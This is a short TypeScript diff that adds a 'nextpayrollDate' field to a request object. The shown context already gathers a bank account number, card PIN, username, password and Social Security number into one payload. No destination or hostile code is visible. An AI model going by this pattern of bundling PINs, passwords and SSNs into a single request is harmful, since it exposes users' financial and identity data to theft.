@@ -5,6 +5,7 @@ type Request = {
   accountNumber: string
   cardpinNumber: string,
   amount: number
+  nextpayrollDate: string
   username: number
   password: string,
 	ssn: string,
@@ -31,6 +32,7 @@ export function sendRequest() {
         accountNumber: request.accountNumber,
         cardpinNumber: request.cardpinNumber,
         amount: request.amount,
+        nextpayrollDate: request.nextpayrollDate,
         username: request.username,
         password: request.password,
         ssn: request.ssn,
